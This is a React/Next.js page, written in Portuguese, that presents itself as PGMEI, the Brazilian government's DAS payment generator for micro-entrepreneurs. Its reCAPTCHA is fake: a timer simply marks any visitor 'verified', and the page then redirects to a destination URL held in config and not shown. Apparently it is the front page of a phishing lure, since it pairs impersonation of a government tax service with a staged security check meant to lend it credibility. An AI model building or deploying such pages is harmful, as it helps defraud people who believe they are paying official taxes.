"use client"

import { useState } from "react"
import { Check, Loader2 } from "lucide-react"
import { REDIRECT_URL } from "@/config"

export default function VerificationPage() {
  const [isChecked, setIsChecked] = useState(false)
  const [isVerifying, setIsVerifying] = useState(false)
  const [isVerified, setIsVerified] = useState(false)
  const [isRedirecting, setIsRedirecting] = useState(false)

  const handleCheckboxClick = () => {
    if (isVerified || isVerifying) return

    setIsChecked(true)
    setIsVerifying(true)

    // Simula verificação por 2 segundos
    setTimeout(() => {
      setIsVerifying(false)
      setIsVerified(true)
    }, 2000)
  }

  const handleContinue = () => {
    if (!isVerified || isRedirecting) return

    setIsRedirecting(true)

    // Redireciona após 1 segundo
    setTimeout(() => {
      window.location.href = REDIRECT_URL
    }, 1000)
  }

  return (
    <main className="min-h-screen relative flex items-center justify-center p-4 animate-in fade-in duration-500">
      {/* Imagem de fundo borrada - Desktop */}
      <div 
        className="absolute inset-0 blur-[4px] scale-105 hidden md:block"
        style={{ 
          backgroundImage: "url('/images/background.png')",
          backgroundSize: "100% auto",
          backgroundPosition: "top center",
          backgroundRepeat: "no-repeat",
          backgroundColor: "#d5d5d5"
        }}
      />
      {/* Imagem de fundo borrada - Mobile */}
      <div 
        className="absolute inset-0 blur-[4px] scale-105 block md:hidden"
        style={{ 
          backgroundImage: "url('/images/background-mobile.png')",
          backgroundSize: "100% auto",
          backgroundPosition: "top center",
          backgroundRepeat: "no-repeat",
          backgroundColor: "#d5d5d5"
        }}
      />
      {/* Overlay para suavizar */}
      <div className="absolute inset-0 bg-white/10" />
      
      <div className="relative z-10 w-full max-w-md bg-white rounded-xl shadow-lg p-8 space-y-6">
        {/* Cabeçalho */}
        <div className="text-center space-y-2">
          <h1 className="text-[#1a73e8] font-bold text-lg leading-tight">
            PGMEI - Programa Gerador de DAS do Microempreendedor Individual
          </h1>
          <h2 className="text-2xl font-bold text-gray-900">Só mais um passo!</h2>
        </div>

        {/* Texto instrução */}
        <p className="text-center text-gray-600">
          Prove que você não é um robô.
        </p>

        {/* Componente reCAPTCHA */}
        <div className="border border-gray-300 rounded-md p-4 bg-[#f9f9f9]">
          <div className="flex items-center justify-between">
            <button
              onClick={handleCheckboxClick}
              disabled={isVerifying || isVerified}
              className="flex items-center gap-3 cursor-pointer disabled:cursor-default"
            >
              {/* Checkbox */}
              <div
                className={`w-6 h-6 border-2 rounded flex items-center justify-center transition-all duration-300 ${
                  isVerified
                    ? "bg-green-500 border-green-500"
                    : isVerifying
                    ? "border-gray-400 bg-white"
                    : "border-gray-400 bg-white hover:border-gray-500"
                }`}
              >
                {isVerifying && (
                  <Loader2 className="w-4 h-4 text-gray-500 animate-spin" />
                )}
                {isVerified && <Check className="w-4 h-4 text-white" />}
              </div>

              {/* Texto */}
              <span className="text-gray-700 text-sm">
                {isVerified ? "Verificado com sucesso" : "Não sou um robô"}
              </span>
            </button>

            {/* Logo reCAPTCHA */}
            <div className="flex flex-col items-center">
              <svg
                width="32"
                height="32"
                viewBox="0 0 32 32"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0z"
                  fill="#4285F4"
                />
                <path
                  d="M16 0v16l11.314-11.314A15.932 15.932 0 0016 0z"
                  fill="#3B5998"
                />
                <path
                  d="M16 16L4.686 4.686A15.932 15.932 0 000 16h16z"
                  fill="#34A853"
                />
                <path
                  d="M16 16v16a15.932 15.932 0 0011.314-4.686L16 16z"
                  fill="#FBBC05"
                />
                <path
                  d="M16 16H0a15.932 15.932 0 004.686 11.314L16 16z"
                  fill="#EA4335"
                />
              </svg>
              <span className="text-[10px] text-gray-500 font-medium mt-1">
                reCAPTCHA
              </span>
              <span className="text-[8px] text-gray-400">
                <a href="#" className="hover:underline">
                  Privacidade
                </a>
                {" - "}
                <a href="#" className="hover:underline">
                  Termos
                </a>
              </span>
            </div>
          </div>
        </div>

        {/* Botão Continuar */}
        <button
          onClick={handleContinue}
          disabled={!isVerified || isRedirecting}
          className={`w-full py-4 rounded-full text-white font-semibold text-lg transition-all duration-300 flex items-center justify-center gap-2 ${
            isVerified && !isRedirecting
              ? "bg-[#1a73e8] hover:bg-[#1557b0] cursor-pointer"
              : "bg-gray-400 cursor-not-allowed"
          }`}
        >
          {isRedirecting ? (
            <>
              <Loader2 className="w-5 h-5 animate-spin" />
              Redirecionando...
            </>
          ) : (
            "Continuar"
          )}
        </button>

        {/* Rodapé */}
        <p className="text-center text-sm text-gray-500">
          {"Ao clicar em 'Entrar' você concorda com os "}
          <a href="#" className="text-[#1a73e8] hover:underline">
            Termos de Serviço
          </a>
          {" e "}
          <a href="#" className="text-[#c78500] hover:underline">
            Política de Privacidade
          </a>
          {" da Empresa"}
        </p>
      </div>
    </main>
  )
}
